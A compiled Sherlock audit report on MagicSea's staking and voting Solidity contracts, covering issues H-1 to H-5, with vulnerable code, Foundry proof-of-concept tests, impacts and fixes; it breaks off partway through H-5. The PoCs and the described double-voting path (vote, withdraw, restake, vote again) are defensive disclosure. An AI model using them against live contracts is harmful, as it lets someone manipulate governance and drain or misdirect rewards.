# Issue H-1: Non-functional vote() if there is one bribe rewarder for this pool 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/39 

## Found by 
0uts1der, 0xAsen, 0xboriskataa, 0xc0ffEE, AuditorPraise, Aymen0909, BengalCatBalu, BlockBusters, ChinmayF, DPS, HonorLt, Honour, Hunter, KupiaSec, PNS, PeterSR, Reentrants, Ryonen, Silvermist, WildSniper, Yanev, Yashar, araj, blackhole, blockchain555, coffiasd, dany.armstrong90, dhank, dimulski, gkrastenov, iamnmt, jennifer37, jsmi, kmXAdam, nikhil840096, pashap9990, radin200, robertodf, rsam\_eth, scammed, slowfi, snapishere, t.aksoy, utsav, web3pwn
## Summary
Permission check in BribeRewarder::deposit(), this will lead to vote() function cannot work if voted pool has any bribe rewarder.

## Vulnerability Detail
When people vote for one pool, there may be some extra rewards provided by bribe rewarders. When users vote for one pool with some bribe rewarders, voter contract will call bribe rewarder's `deposit` function. However, in bribe rewarder's `deposit()` function, there is one security check, the caller should be the NFT's owner, which is wrong. Because the voter contract call bribe rewarder's `deposit()`, msg.sender is voter contract, not the owner of NFT.
This will block all vote() transactions if this votes pool has any bribe rewarder.
```c
    function vote(uint256 tokenId, address[] calldata pools, uint256[] calldata deltaAmounts) external {
        ......
        IVoterPoolValidator validator = _poolValidator;
        for (uint256 i = 0; i < pools.length; ++i) {
          ......
            uint256 deltaAmount = deltaAmounts[i];
            // per user account
            _userVotes[tokenId][pool] += deltaAmount;
            // per pool account
            _poolVotesPerPeriod[currentPeriodId][pool] += deltaAmount;
            // @audit_fp should we clean the _votes in one new vote period ,no extra side effect found
            if (_votes.contains(pool)) {
                _votes.set(pool, _votes.get(pool) + deltaAmount);
            } else {
                _votes.set(pool, deltaAmount);
            }
            // bribe reward will record voter
@==>   _notifyBribes(_currentVotingPeriodId, pool, tokenId, deltaAmount); // msg.sender, deltaAmount);
        }
        ......
    }
    function _notifyBribes(uint256 periodId, address pool, uint256 tokenId, uint256 deltaAmount) private {
        IBribeRewarder[] storage rewarders = _bribesPerPriod[periodId][pool];
        for (uint256 i = 0; i < rewarders.length; ++i) {
            if (address(rewarders[i]) != address(0)) {
                // bribe rewarder will record vote.
                rewarders[i].deposit(periodId, tokenId, deltaAmount);
                _userBribesPerPeriod[periodId][tokenId].push(rewarders[i]);
            }
        }
    }
    function deposit(uint256 periodId, uint256 tokenId, uint256 deltaAmount) public onlyVoter {
        _modify(periodId, tokenId, deltaAmount.toInt256(), false);

        emit Deposited(periodId, tokenId, _pool(), deltaAmount);
    }
    function _modify(uint256 periodId, uint256 tokenId, int256 deltaAmount, bool isPayOutReward)
        private
        returns (uint256 rewardAmount)
    {
        // If you're not the NFT owner, you cannot claim
        if (!IVoter(_caller).ownerOf(tokenId, msg.sender)) {
            revert BribeRewarder__NotOwner();
        }
```
### Poc
When alice tries to vote for one pool with one bribe rewarder, the transaction will be reverted with the reason 'BribeRewarder__NotOwner'
```javascript
    function testPocVotedRevert() public {
        vm.startPrank(DEV);
        ERC20Mock(address(_rewardToken)).mint(address(ALICE), 100e18);
        vm.stopPrank();
        vm.startPrank(ALICE);
        rewarder1 = BribeRewarder(payable(address(factory.createBribeRewarder(_rewardToken, pool))));
        ERC20Mock(address(_rewardToken)).approve(address(rewarder1), 20e18);
        // Register
        //_voter.onRegister();
        rewarder1.fundAndBribe(1, 2, 10e18);
        vm.stopPrank();
        // join and register with voter
        // Create position at first
        vm.startPrank(ALICE);
        // stake in mlum to get one NFT
        _createPosition(ALICE);

        vm.prank(DEV);
        _voter.startNewVotingPeriod();
        vm.startPrank(ALICE);
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        // withdraw this NFT
        vm.stopPrank();
    }
```
## Impact
vote() will be blocked for pools which owns any bribe rewarders.

## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L143-L147
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L260-L269
## Tool used

Manual Review

## Recommendation
This security check should be valid in claim() function. We should remove this check from deposit().



## Discussion

**0xSmartContract**

The internal `_modify()` call of the `deposit()` function checks the identity of the token owner; this fails because `msg.sender` is the voter contract, not the owner.So it is impossible to vote for pools that have bribe rewarders.

**0xHans1**

PR: https://github.com/metropolis-exchange/magicsea-staking/pull/13

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/13


# Issue H-2: A voter lose bribe rewards if another voter voted before claim. 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/52 

## Found by 
0xAsen, 0xboriskataa, ChinmayF, Honour, KupiaSec, PeterSR, Silvermist, araj, dhank, excalibor, jsmi, kmXAdam, pashap9990, rsam\_eth, scammed, slowfi, tedox, utsav
## Summary
A voter lose bribe rewards if another voter voted before claim.

## Vulnerability Detail
This problem is related to design architecture.
In `BribeRewarder.sol`, the `_lastUpdateTimestamp` is used to calculate the unclaimed rewards for `periodId`, but it is not dependent on `periodId`.
Therefore, once `_lastUpdateTimestamp` has been updated to the next period, there is no way to calculate the unclaimed rewards for the previous period.

The following is the modified test code for PoC.
```solidity
    function testDepositMultiple() public {
        ERC20Mock(address(rewardToken)).mint(address(this), 20e18);
        ERC20Mock(address(rewardToken)).approve(address(rewarder), 20e18);

        rewarder.fundAndBribe(1, 2, 10e18);

        _voterMock.setCurrentPeriod(1);
        _voterMock.setStartAndEndTime(0, 100);

        // time: 0
        vm.warp(0);
        vm.prank(address(_voterMock));
        rewarder.deposit(1, 1, 0.2e18);

        assertEq(0, rewarder.getPendingReward(1));

        // time: 50, seconds join
        vm.warp(50);
        vm.prank(address(_voterMock));
        rewarder.deposit(1, 2, 0.2e18);

        // time: 100
        vm.warp(100);
        _voterMock.setCurrentPeriod(2);
        _voterMock.setStartAndEndTime(0, 100);
        _voterMock.setLatestFinishedPeriod(1);

        // @audit-info next period started
        vm.warp(150);

        // 1 -> [0,50] -> 1: 0.5
        // 2 -> [50,100] -> 1: 0.25 + 0.5, 2: 0.25

        assertEq(7500000000000000000, rewarder.getPendingReward(1));
        assertEq(2500000000000000000, rewarder.getPendingReward(2));

        // @audit-info Another voter votes before claim.
        vm.prank(address(_voterMock));
        rewarder.deposit(2, 3, 0.1e18);

        // @audit-info The expected rewards decreased much
        assertEq(5000000000000000000, rewarder.getPendingReward(1));
        assertEq(0, rewarder.getPendingReward(2));

        vm.prank(alice);
        rewarder.claim(1);

        vm.prank(bob);
        rewarder.claim(2);

        // @audit-info The claimed rewards decreased too.
        assertEq(5000000000000000000, rewardToken.balanceOf(alice));
        assertEq(0, rewardToken.balanceOf(bob));

        assertEq(7500000000000000000, rewardToken.balanceOf(alice), "balance of alice should be 75e17 but 50e17");
        assertEq(2500000000000000000, rewardToken.balanceOf(bob), "balance of bob should be 25e17 but 0");
    }
```
The claimed rewards amount of alice and bob for 1st period are originally `75e17` and `25e17`, respectively.
But if a voter votes for 2nd period before alice and bob claim their rewards for 1st period, the claimed rewards amount of alice and bob will be decreased to `50e17` and `zero`, respectively.
It means that the rewards for [50,100] of 1st period are will not be claimed.

And the following is the test command and result.
```bash
$ forge test --match-test testDepositMultiple

Failing tests:
Encountered 1 failing test in test/BribeRewarder.t.sol:BribeRewarderTest
[FAIL. Reason: balance of alice should be 75e17 but 50e17: 7500000000000000000 != 5000000000000000000] testDepositMultiple() (gas: 767761)
```
As shown above, if anyone votes before alice and bob claim their rewards, the rewards of alice and bob will be decreased.

## Impact
Voters lose bribe rewards if another voter voted before claim.
And such cases can occur frequently enough.

## Code Snippet
- [magicsea-staking/src/rewarders/BribeRewarder.sol#L65](https://github.com/sherlock-audit/2024-06-magicsea/tree/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L65)
- [magicsea-staking/src/rewarders/BribeRewarder.sol#L260-L298](https://github.com/sherlock-audit/2024-06-magicsea/tree/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L260-L298)

## Tool used
Manual Review

## Recommendation
Change the `_lastUpdateTimestamp` state variable to be dependent on `periodId`.
For instance, change it to mapping variable such as `mapping(uint256 periodId => uint256) _lastUpdateTimestamp;`.



## Discussion

**0xSmartContract**

High severity because this will occur without an attacker and between all Bribe Rewards, resulting in reward loss for all voters. A side effect of this is that rewards sent to Bribe Rewards will be stuck in the contract forever.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/20


# Issue H-3: Wrong call order for `setTopPoolIdsWithWeights`, resulting in wrong distribution of rewards 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/107 

## Found by 
PUSH0, iamnmt, jsmi
## Summary

Per the Sherlock rules:

> If the protocol team provides specific information in the README or CODE COMMENTS, that information stands above all judging rules.

The Masterchef contract allows people to stake an admin-selected token in farms to earn LUM rewards. Each two weeks, MLUM stakers can vote on their favorite pools, and the top pools will earn LUM emissions according to the votes. Admin has to call `setTopPoolIdsWithWeights` to set those votes and weights to set the reward emission for the next two weeks.

Per the documented call order for `setTopPoolIdsWithWeights`:

```solidity
/**
* @dev Set farm pools with their weight;
*
* WARNING:
* Caller is responsible to updateAll oldPids on masterChef before using this function
* and also call updateAll for the new pids after.
*
* @param pids - list of pids
* @param weights - list of weights
*/
```

We show that this call order is wrong, and will result in wrong rewards distribution.

## Vulnerability Detail

There is a global parameter `lumPerSecond`, set by the admin. Whenever `updateAll` is called for a set of pools:
- Let the total weight of all votes across all top pools be `totalWeight`
- Let the **current** weight of a pool Pid be `weightPid`. This weight can be set by the admin using `setTopPoolIdsWithWeights`
- Pool Pid will earn `totalLumRewardForPid = (lumPerSecond * weightPid / totalWeight) * (elapsed_time)`, i.e. each second it earns `lumPerSecond` times its percentage of voted weight `weightPid` across the total weight all top pools `totalWeight`.

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L522-L525

Now, the function `updateAll` does the following:
- For each pool, fetch its weight and calculate its `totalLumRewardForPid` since last update
- Mint that calculated amount of LUM
- `updateAccDebtPerShare` i.e. distribute rewards since the last updated time

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L526-L528

Per the code comments, the admin is responsible for calling `updateAll()` on the old pools before calling `setTopPoolIdsWithWeights()` for the new pools, and *then* calling `updateAll()` on the new pools.

We claim that, using this call order, a pool will be wrongly updated if it's within the set `newPid` but not in `oldPid`, and the functions are called with this order. Take this example. 

## PoC

Let LUM per second = 1. We assume all farms were created and registered at time 0:
- At time 1000: there are two pools, A and B making it into the top pools. Weight = 1 both. 
  - `updateAll` for oldPid. There are no old Pids
  - `setTopPoolIdsWithWeights`: Pool A and pool B now have weight = 1.
  - `updateAll` for newPid (A and B). 1000 seconds passed, each pool accrued 500 LUM for having 50% weight despite just making it into the top weighted pools
- At time 2000: a new pool C makes it into the pool, while pool B is no longer in the top. Weight = 1 both. 
  - `updateAll` for oldPid (A and B).
    - For pool A, 1000 seconds passed. It earns 500 LUM
    - For pool B, 1000 seconds passed. It earns 500 LUM
  - `setTopPoolIdsWithWeights`: Pool A and pool C now have weight = 1.
  - `updateAll` for newPid (A and C). 
    - For pool A, 0 seconds passed. It earns 0 LUM
    - For pool C, 2000 seconds passed. It earns 1000 LUM

The end result is that, at time 2000:
- Pool A accrued 1000 LUM
- Pool B accrued 1000 LUM
- Pool C accrued 1000 LUM

Where the correct result should be:
- Pool A accrued 500 LUM, it was in the top pools in time 1000 to 2000
- Pool B accrued 500 LUM, it was in the top pools in time 1000 to 2000
- Pool C accrued 0 LUM, it only started being in the top pools from timestamp 2000

In total, 3000 LUM has been distributed from timestamps 1000 to 2000, despite the emission rate should be 1 LUM per second. In fact, LUM has been wrongly distributed since timestamp 1000, as both pool A and B never made it into the top pools but still immediately accrued 500 LUM each.

This is because if a pool is included in an `updateAll` call **after** its weight has been set, its last updated timestamp is still in the past. Therefore when `updateAll` is called, the new weights are applied across the entire interval since it was last updated (i.e. a far point in the past). 

## Coded PoC

We provide a coded PoC to prove the impact of timestamp 1000. We add two farms A and B. LUM per second is set to 1000 wei per second. We also have a single staker Alice depositing into farm A.

We have two tests to compare the results:
- Both tests set the pool weights at time 1000, then output Alice's pending reward right after that.
- There are no `oldPids`, so there's no need to call `updateAll()` on anything before setting weights.
- In one test, we call `updateAll(newPids)` *after* calling `setTopPoolIdsWithWeights()`.
- In the other test, we call `updateAll(newPids)` *before* calling `setTopPoolIdsWithWeights()`.

We output the pending rewards of Alice for comparison.

First, change the function `mint()` of contract `MockERC20` to be the following:

```solidity
function mint(address _to, uint256 _amount) external returns (uint256) {
    _mint(_to, _amount);
    return _amount;
}
```

Then, create a new test file `MasterChefTest.t.sol`:

<details>
  <summary>forge test --match-test testSetPoolWeights -vv</summary>

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import {SafeERC20, IERC20} from "openzeppelin/token/ERC20/utils/SafeERC20.sol";

import "../src/transparent/TransparentUpgradeableProxy2Step.sol";

import "openzeppelin/token/ERC721/ERC721.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import {ERC20Mock} from "./mocks/ERC20.sol";
import {MasterChef} from "../src/MasterChefV2.sol";
import {MlumStaking} from "../src/MlumStaking.sol";
import "../src/Voter.sol";
import "../src/rewarders/BaseRewarder.sol";
import "../src/rewarders/MasterChefRewarder.sol";
import "../src/rewarders/RewarderFactory.sol";
import {IVoter} from "../src/interfaces/IVoter.sol";
import {ILum} from "../src/interfaces/ILum.sol";
import {IRewarderFactory} from "../src/interfaces/IRewarderFactory.sol";

contract MasterChefV2Test is Test {
    address payable immutable DEV = payable(makeAddr("dev"));
    address payable immutable ALICE = payable(makeAddr("alice"));
    address payable immutable BOB = payable(makeAddr("bob"));

    Voter private _voter;
    MlumStaking private _pool;
    MasterChef private _masterChefV2;

    ERC20Mock private farmA;
    ERC20Mock private farmB;
    ERC20Mock private farmC;

    MasterChefRewarder rewarderPoolA;
    MasterChefRewarder rewarderPoolB;
    MasterChefRewarder rewarderPoolC;

    RewarderFactory factory;

    ERC20Mock private _stakingToken;
    ERC20Mock private _rewardToken;
    ERC20Mock private _lumToken;

    uint256[] pIds;
    uint256[] weights;

    function setUp() public {
        vm.prank(DEV);
        _stakingToken = new ERC20Mock("MagicLum", "MLUM", 18);

        vm.prank(DEV);
        _rewardToken = new ERC20Mock("USDT", "USDT", 6);

        vm.prank(DEV);
        address poolImpl = address(new MlumStaking(_stakingToken, _rewardToken));

        _pool = MlumStaking(
            address(
                new TransparentUpgradeableProxy2Step(
                    poolImpl, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(MlumStaking.initialize.selector, DEV)
                )
            )
        );

        address factoryImpl = address(new RewarderFactory());
        factory = RewarderFactory(
            address(
                new TransparentUpgradeableProxy2Step(
                    factoryImpl,
                    ProxyAdmin2Step(address(1)),
                    abi.encodeWithSelector(
                        RewarderFactory.initialize.selector, address(this), new uint8[](0), new address[](0)
                    )
                )
            )
        );

        vm.prank(DEV);
        _lumToken = new ERC20Mock("Lum", "LUM", 18);
        farmA = new ERC20Mock("Farm A", "FARM A", 18);
        farmB = new ERC20Mock("Farm B", "FARM B", 18);
        farmC = new ERC20Mock("Farm C", "FARM C", 18);

        vm.prank(DEV);
        address masterChefImp = address(new MasterChef(ILum(address(_lumToken)), _voter, factory,DEV,1));

        _masterChefV2 = MasterChef(
            address(
                new TransparentUpgradeableProxy2Step(
                    masterChefImp, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(MasterChef.initialize.selector, DEV,DEV)
                )
            )
        );
        vm.prank(DEV);
        _masterChefV2.setLumPerSecond(1000);
        vm.prank(DEV);
        _masterChefV2.setMintLum(true);

        //add 3 farms
        vm.prank(DEV);
        _masterChefV2.add(farmA,IMasterChefRewarder(address(0)));
        vm.prank(DEV);
        _masterChefV2.add(farmB,IMasterChefRewarder(address(0)));
        vm.prank(DEV);
        _masterChefV2.add(farmC,IMasterChefRewarder(address(0)));

        vm.prank(DEV);
        address voterImpl = address(new Voter(_masterChefV2, _pool, factory));

        _voter = Voter(
            address(
                new TransparentUpgradeableProxy2Step(
                    voterImpl, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(Voter.initialize.selector, DEV)
                )
            )
        );

        vm.prank(DEV);
        _voter.updateMinimumLockTime(2 weeks);

        vm.prank(DEV);
        factory.setRewarderImplementation(
            IRewarderFactory.RewarderType.MasterChefRewarder, IRewarder(address(new MasterChefRewarder(address(_masterChefV2))))
        );

        vm.prank(DEV);
        _masterChefV2.setVoter(_voter);
    }

    //SetPoolWeightsTest Correct
    function testSetPoolWeightsCorrect() public {
        pIds.push(0);
        pIds.push(1);
        weights.push(500);
        weights.push(500);

        farmA.mint(ALICE, 2 ether);

        vm.prank(ALICE);
        farmA.approve(address(_masterChefV2), 1 ether);
        vm.prank(ALICE);
        _masterChefV2.deposit(0, 1 ether);

        skip(1000);
        vm.prank(DEV);
        _masterChefV2.updateAll(pIds);

        vm.prank(DEV);
        _voter.setTopPoolIdsWithWeights(pIds,weights);

        (uint256[] memory lumRewards,IERC20[] memory tokens,uint256[] memory extraRewards) = _masterChefV2.getPendingRewards(ALICE, pIds);
        console.log("Alice rewards correct:");
        console.log(lumRewards[0]);
    }

    //SetPoolWeightsTest Wrong
    function testSetPoolWeightsWrong() public {
        pIds.push(0);
        pIds.push(1);
        weights.push(500);
        weights.push(500);

        farmA.mint(ALICE, 2 ether);

        vm.prank(ALICE);
        farmA.approve(address(_masterChefV2), 1 ether);
        vm.prank(ALICE);
        _masterChefV2.deposit(0, 1 ether);

        skip(1000);
        vm.prank(DEV);
        _voter.setTopPoolIdsWithWeights(pIds,weights);

        vm.prank(DEV);
        _masterChefV2.updateAll(pIds);

        (uint256[] memory lumRewards,IERC20[] memory tokens,uint256[] memory extraRewards) = _masterChefV2.getPendingRewards(ALICE, pIds);
        console.log("Alice rewards wrong:");
        console.log(lumRewards[0]);
    }
}
```

</details>

And the results are:

```txt
Ran 2 tests for test/MasterChefTest.t.sol:MasterChefV2Test
[PASS] testSetPoolWeightsCorrect() (gas: 506430)
Logs:
  Alice rewards correct:
  0

[PASS] testSetPoolWeightsWrong() (gas: 589539)
Logs:
  Alice rewards wrong:
  499999

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.54ms (559.21µs CPU time)
```

As shown, in the "correct" test, Alice has not accrued any rewards right after the new weights are set. However, in the "wrong" test, Alice accrues 499999 reward units right after setting. 

## Impact

Pools that have just made it into the top pools will have already accrued rewards for time intervals it wasn't in the top pools. Rewards are thus severely inflated.

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L250-L260

## Tool used

Manual Review

## Recommendation

All of the pools (oldPids and newPids) should be updated, only then weights should be applied.

In other words, the correct call order should be:
- `updateAll` should be called for **all** pools within oldPid or newPid.
- `setTopPoolIdsWithWeights` should then be called.

Additionally, we think it might be better that `setTopPoolIdsWithWeights` itself should just call `updateAll` for all (old and new) pools before updating the pool weights, or at least validate that their last updated timestamp is sufficiently fresh.



## Discussion

**0xSmartContract**

Failure to follow the correct order of calls of the `setTopPoolIdsWithWeights` function in the `Masterchefv2.sol` contract causes pools to accumulate incorrect LUM rewards. The description of the function states that the `updateAll` function should be called for old repositories and then called again for new repositories. 

However, if this call order is not followed, new pools will also accumulate rewards for periods before entering the top pools. This leads to over distribution of rewards and a serious inflation effect.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/22


# Issue H-4: Voters will lose all bribe rewards forever if they do not claim their rewards after the last bribing period 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/164 

## Found by 
0uts1der, 0xWhitehat, Aymen0909, BengalCatBalu, ChinmayF, Honour, KupiaSec, PUSH0, PeterSR, Reentrants, araj, aslanbek, blockchain555, coffiasd, dany.armstrong90, dimulski, iamnmt, kmXAdam, mahdikarimi, novaman33, pashap9990, scammed, slowfi, utsav, web3pwn
## Summary

The `claim()` function in `BribeRewarder` is used to claim the rewards associated with a tokenID across all bribe periods that have ended : it iterates over all the voting periods starting from the bribe rewarder's `_startVotingPeriod` upto the last period that ended according to the Voter.sol contract, and collects and sends rewards to the NFT's owner.

The issue is that if the voter(ie. tokenID owner who earned bribe rewards for one or more bribe periods) does not claim his rewards by the lastVotingPeriod + 2, then all his unclaimed rewards for all periods will be lost forever.

## Vulnerability Detail

Lets walk through an example to better understand the issue. Even though the issue occurs in all other cases, we are assuming that the voting period has just started to make it easy to understand.

1. The first voting period is about to start in the next block. The bribe provider deploys a bribe rewarder and registers it for a pool X for voting periods 1 to 5. ie. the startVotingPeriod in the BribeRewarder.sol = 1 and lastVotingPeriod = 5.
2. The first voting period starts in voter.sol. Users start voting for pool X and the BribeRewarder keeps getting notified and storing the rewards data in respective rewarder data structure (see [here](https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/rewarders/BribeRewarder.sol#L274) and [here](https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/rewarders/BribeRewarder.sol#L282))
3. All 5 voting periods have ended. User voted in all voting periods and got a reward stored for all 5 bribe periods in the BribeRewarder contract. Now when he claims via claim(), he can get all his rewards.
4. Assume that the 6th voting period has ended. Still if the user calls claim(), he will get back all his rewards. His 6th period rewards will be empty but it does not revert.
5. Assume that the 7th voting period has ended. Now if the user calls claim(), his call will revert and from now on, he will never be able to claim any of his unclaimed rewards for all periods.

The reason of this issue is this :

```solidity
    function claim(uint256 tokenId) external override {
        uint256 endPeriod = IVoter(_caller).getLatestFinishedPeriod();
        uint256 totalAmount;

        for (uint256 i = _startVotingPeriod; i <= endPeriod; ++i) {
            totalAmount += _modify(i, tokenId, 0, true);
        }

        emit Claimed(tokenId, _pool(), totalAmount);
    }
```

The claim function is the only way to claim a user's rewards after he has voted. This iterates over the voting periods starting from the `_startVotingPeriod` (which is equal to 1 in our example).

This loop's last iteration is the latest voting period that might have ended on the voter contract (regardless of if it was a declared as a bribe period in our own BribeRewarder since voting periods will be a forever going thing and we only want to reward upto a limited set of periods, defined by `BribeRewarder:_lastVotingPeriod`).

Lets see the `Voter.getLatestFinishedPeriod()` function :

```solidity
    function getLatestFinishedPeriod() external view override returns (uint256) {
        if (_votingEnded()) {
            return _currentVotingPeriodId;
        }
        if (_currentVotingPeriodId == 0) revert IVoter__NoFinishedPeriod();
        return _currentVotingPeriodId - 1;
    }
```

Now if suppose the 6th voting period is running, it will return 5 as finished. if 7th is running, it will return 6, and if 8th period has started, it will return 7.

Now back to `claim => _modify`. [It fetches the rewards data](https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/rewarders/BribeRewarder.sol#L274) for that period in the `_rewards` array, which has (lastID - startID) + 2 elements. (see [here](https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/rewarders/BribeRewarder.sol#L250)). In our case, this array will consist of 6 elements (startId = 1 and lastID = 5).

Now when we see how it is fetching the reward data using periodID, it is using the value returned by `_indexByPeriodId()` as the index of the array.

```solidity
    function _indexByPeriodId(uint256 periodId) internal view returns (uint256) {
        return periodId - _startVotingPeriod;
    }
```

So for a periodID = 7, this will return index 6.

Now back to the example above. When the 7th voting period has ended, getLatestFinishedPeriod() will return 7 and the claim function will try to iterate over all the periods that have ended. When the iteration comes to this last period = 7, the `_modify` function will try to read the array element at index 6 (again we can see this clearly [here](https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/rewarders/BribeRewarder.sol#L274))

But now it will revert with index out of bounds, because the array only has 6 elements from index 0 to index 5, so trying to access index element 6 in `_rewards` array will now always revert.

This means that after 2 periods have passed after the last bribing period, no user can ever claim any of their rewards even if they voted for all the periods.

## Impact

No user will be able to claim any of their unclaimed rewards for any periods from the BribeRewarder, after this time. The rewards will be lost forever, and a side effect of this is that these rewards will remain stuck in the BribeRewarder. But the main impact is the complete loss of rewards of many users.

High severity because users should always get their deserved rewards, and many users could lose rewards this way at the same time. The damage to the individual user depends on how many periods they didn't claim for and how much amount they used for voting, which could be a very large amount.

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/rewarders/BribeRewarder.sol#L159

## Tool used

Manual Review

## Recommendation

The solution is simple : in the claim function, limit the `endPeriod` used in the loop by the `_lastVotingPeriod` of a particular BribeRewarder.

```solidity
    uint256 endPeriod = IVoter(_caller).getLatestFinishedPeriod();
    if (endPeriod > _lastVotingPeriod) endPeriod = _lastVotingPeriod;

```



## Discussion

**0xSmartContract**

If the function to claim rewards in the `BribeRewarder` contract is not used within two periods after the last voting period, users will lose all rewards.

This may cause many users to lose their rewards, which will remain locked in the contract forever. Solution ; is to limit the request cycle to `_lastVotingPeriod`.

**0xHans1**

PR: https://github.com/metropolis-exchange/magicsea-staking/pull/14

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/12


# Issue H-5: Voting does not take into account end of staking lock period 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/166 

## Found by 
0xAnmol, 0xBhumii, 0xpranav, Aymen0909, BengalCatBalu, ChinmayF, DPS, HugoDowsers, Hunter, KupiaSec, LeFy, PUSH0, PeterSR, Reentrants, Silvermist, WildSniper, anonymousjoe, araj, aslanbek, blackhole, blockchain555, cocacola, coffiasd, dany.armstrong90, dhank, dimulski, fibonacci, iamnmt, jah, jennifer37, jsmi, kmXAdam, novaman33, pwning\_dev, qmdddd, rsam\_eth, santipu\_, scammed, snapishere, tedox, typicalHuman, utsav, web3pwn, ydlee, zarkk01
## Summary

The protocol allows to vote in `Voter` contract by means of staked position in `MlumStaking`. To vote, user must have staking position with certain properties. However, the voting does not implement check against invariant that the remaining lock period needs to be longer then the epoch time to be eligible for voting. Thus, it is possible to vote with stale voting position. Additionally, if position's lock period finishes inside of the voting epoch it is possible to vote, withdraw staked position, stake and vote again in the same epoch. Thus, voting twice with the same stake amount is possible from time to time. Ultimately, the invariant that voting once with same balance is only allowed is broken as well.
The voting will decide which pools receive LUM emissions and how much.

## Vulnerability Detail

The documentation states that:

> Who is allowed to vote
> Only valid Magic LUM Staking Position are allowed to vote. The overall lock needs to be longer then 90 days and the remaining  lock period needs to be longer then the epoch time. 

User who staked position in the `MlumStaking` contract gets NFT minted as a proof of stake with properties describing this stake. Then, user can use that staking position to vote for pools by means of `vote()` in `Voter` contract. The `vote()` functions checks if `initialLockDuration` is higher than `_minimumLockTime` and `lockDuration` is higher than `_periodDuration` to process further. However, it does not check whether the remaining lock period is longer than the epoch time. 
Thus, it is possible to vote with stale staking position.
Also, current implementation makes `renewLockPosition` and `extendLockPosition` functions useless.

```solidity
    function vote(uint256 tokenId, address[] calldata pools, uint256[] calldata deltaAmounts) external {
        if (pools.length != deltaAmounts.length) revert IVoter__InvalidLength();

        // check voting started
        if (!_votingStarted()) revert IVoter_VotingPeriodNotStarted();
        if (_votingEnded()) revert IVoter_VotingPeriodEnded();

        // check ownership of tokenId
        if (_mlumStaking.ownerOf(tokenId) != msg.sender) {
            revert IVoter__NotOwner();
        }

        uint256 currentPeriodId = _currentVotingPeriodId;
        // check if alreay voted
        if (_hasVotedInPeriod[currentPeriodId][tokenId]) {
            revert IVoter__AlreadyVoted();
        }

        // check if _minimumLockTime >= initialLockDuration and it is locked
        if (_mlumStaking.getStakingPosition(tokenId).initialLockDuration < _minimumLockTime) {
            revert IVoter__InsufficientLockTime();
        }
        if (_mlumStaking.getStakingPosition(tokenId).lockDuration < _periodDuration) {
            revert IVoter__InsufficientLockTime();
        }

        uint256 votingPower = _mlumStaking.getStakingPosition(tokenId).amountWithMultiplier;

        // check if deltaAmounts > votingPower
        uint256 totalUserVotes;
        for (uint256 i = 0; i < pools.length; ++i) {
            totalUserVotes += deltaAmounts[i];
        }

        if (totalUserVotes > votingPower) {
            revert IVoter__InsufficientVotingPower();
        }

        IVoterPoolValidator validator = _poolValidator;

        for (uint256 i = 0; i < pools.length; ++i) {
            address pool = pools[i];

            if (address(validator) != address(0) && !validator.isValid(pool)) {
                revert Voter__PoolNotVotable();
            }

            uint256 deltaAmount = deltaAmounts[i];

            _userVotes[tokenId][pool] += deltaAmount;
            _poolVotesPerPeriod[currentPeriodId][pool] += deltaAmount;

            if (_votes.contains(pool)) {
                _votes.set(pool, _votes.get(pool) + deltaAmount);
            } else {
                _votes.set(pool, deltaAmount);
            }

            _notifyBribes(_currentVotingPeriodId, pool, tokenId, deltaAmount); // msg.sender, deltaAmount);
        }

        _totalVotes += totalUserVotes;

        _hasVotedInPeriod[currentPeriodId][tokenId] = true;

        emit Voted(tokenId, currentPeriodId, pools, deltaAmounts);
    }
```

The documentation states that minimum lock period for staking to be eligible for voting is 90 days.
The documentation states that voting for pools occurs biweekly.

Thus, assuming the implementation with configuration presented in the documentation, every 90 days it is possible to vote twice within the same voting epoch by:
- voting,
- withdrawing staked amount,
- creating new position with staking token,
- voting again.

```solidity
    function createPosition(uint256 amount, uint256 lockDuration) external override nonReentrant {
        // no new lock can be set if the pool has been unlocked
        if (isUnlocked()) {
            require(lockDuration == 0, "locks disabled");
        }

        _updatePool();

        // handle tokens with transfer tax
        amount = _transferSupportingFeeOnTransfer(stakedToken, msg.sender, amount);
